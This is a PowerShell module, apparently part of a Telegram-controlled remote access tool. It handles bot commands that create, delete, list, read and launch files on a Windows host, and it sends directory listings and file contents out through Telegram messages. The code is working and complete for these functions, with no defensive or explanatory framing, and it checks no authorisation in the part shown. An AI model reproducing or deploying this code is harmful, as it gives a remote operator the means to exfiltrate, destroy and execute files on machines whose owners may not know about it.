# File Management Commands

function Process-FileCommands {
    param (
        [string[]]$parts
    )
    
    switch ($parts[0]) {
        "/createfile" {
            try {
                $filePath = $parts[1]
                $content = $parts[2..($parts.Length - 1)] -join " "
                
                # Check if directory exists and is accessible
                $directory = Split-Path -Path $filePath -Parent
                if (-not (Test-Path -Path $directory)) {
                    Send-TelegramMessage -message "Directory does not exist: $directory"
                    return
                }
                
                # Try to create the file
                New-Item -Path $filePath -ItemType File -Force -ErrorAction Stop
                Set-Content -Path $filePath -Value $content -ErrorAction Stop
                Send-TelegramMessage -message "File created at $filePath with content."
            }
            catch {
                Send-TelegramMessage -message "Error creating file: $_"
            }
        }
        "/removefile" {
            try {
                $filePath = $parts[1]
                if (Test-Path $filePath) {
                    Remove-Item $filePath -Force -ErrorAction Stop
                    Send-TelegramMessage -message "File removed at $filePath."
                } else {
                    Send-TelegramMessage -message "File does not exist."
                }
            }
            catch {
                Send-TelegramMessage -message "Error removing file: $_"
            }
        }
        "/listfiles" {
            try {
                $dirPath = $parts[1]
                if (-not (Test-Path $dirPath)) {
                    Send-TelegramMessage -message "Directory does not exist: $dirPath"
                    return
                }
                
                # Get directory contents with error handling
                $files = Get-ChildItem -Path $dirPath -ErrorAction Stop | 
                    ForEach-Object { 
                        @{
                            Name = $_.Name
                            Type = if ($_.PSIsContainer) { "Directory" } else { "File" }
                            Size = if (-not $_.PSIsContainer) { 
                                $size = $_.Length
                                $units = @('B', 'KB', 'MB', 'GB', 'TB')
                                $index = 0
                                while ($size -gt 1024 -and $index -lt $units.Count - 1) {
                                    $size = $size / 1024
                                    $index++
                                }
                                "$([math]::Round($size, 2)) $($units[$index])"
                            } else { "N/A" }
                        }
                    }
                
                if ($files.Count -eq 0) {
                    Send-TelegramMessage -message "Directory is empty."
                    return
                }

                # Send header message
                Send-TelegramMessage -message "Directory Contents for: $dirPath`nTotal Items: $($files.Count)"
                
                # Process files in chunks
                $chunkSize = 20  # Number of files per message
                $totalChunks = [math]::Ceiling($files.Count / $chunkSize)
                
                for ($i = 0; $i -lt $files.Count; $i += $chunkSize) {
                    $chunk = $files | Select-Object -Skip $i -First $chunkSize
                    $currentChunk = [math]::Floor($i / $chunkSize) + 1
                    
                    $fileList = "`nPart ${currentChunk} of ${totalChunks}:`n"
                    foreach ($file in $chunk) {
                        $fileList += "`nName: $($file.Name)`n"
                        $fileList += "Full Path: $(Join-Path $dirPath $file.Name)`n"
                        $fileList += "Type: $($file.Type)`n"
                        $fileList += "Size: $($file.Size)`n"
                        $fileList += "------------------------------------"
                    }
                    
                    # Add navigation info if there are multiple chunks
                    if ($totalChunks -gt 1) {
                        $fileList += "`n`nPage $currentChunk of $totalChunks"
                    }
                    
                    Send-TelegramMessage -message $fileList
                    Start-Sleep -Milliseconds 500  # Small delay between messages to prevent rate limiting
                }
            }
            catch {
                Send-TelegramMessage -message "Error listing files: $_"
            }
        }
        "/getfilecontent" {
            try {
                $filePath = $parts[1]
                if (-not (Test-Path $filePath)) {
                    Send-TelegramMessage -message "File does not exist: $filePath"
                    return
                }
                
                # Check if it's a directory
                if ((Get-Item $filePath) -is [System.IO.DirectoryInfo]) {
                    Send-TelegramMessage -message "Cannot get content of a directory. Please specify a file."
                    return
                }
                
                # Try to read file content with proper error handling
                $fileContent = Get-Content -Path $filePath -Raw -ErrorAction Stop
                if ($fileContent.Length -gt 4000) {
                    Send-TelegramMessage -message "File is too large to display (over 4000 characters). Please use /sendfile command to download it."
                } else {
                    Send-TelegramMessage -message "Content of $filePath :`n$fileContent"
                }
            }
            catch [System.UnauthorizedAccessException] {
                Send-TelegramMessage -message "Access denied. You don't have permission to read this file."
            }
            catch {
                Send-TelegramMessage -message "Error reading file: $_"
            }
        }
        "/runfile" {
            try {
                if ($parts.Length -gt 1) {
                    $filePath = $parts[1..($parts.Length - 1)] -join " "
                    
                    if (-not (Test-Path -Path $filePath)) {
                        Send-TelegramMessage -message "File does not exist at '$filePath'."
                        return
                    }
                    
                    # Check if it's a directory
                    if ((Get-Item $filePath) -is [System.IO.DirectoryInfo]) {
                        Send-TelegramMessage -message "Cannot run a directory. Please specify a file."
                        return
                    }
                    
                    # Start the process for the file using 'explorer' to open by default app
                    Start-Process -FilePath "explorer.exe" -ArgumentList $filePath -ErrorAction Stop
                    Send-TelegramMessage -message "File '$filePath' is being executed."
                } else {
                    Send-TelegramMessage -message "No file path provided."
                }
            }
            catch {
                Send-TelegramMessage -message "Error running file: $_"
            }
        }
    }
} 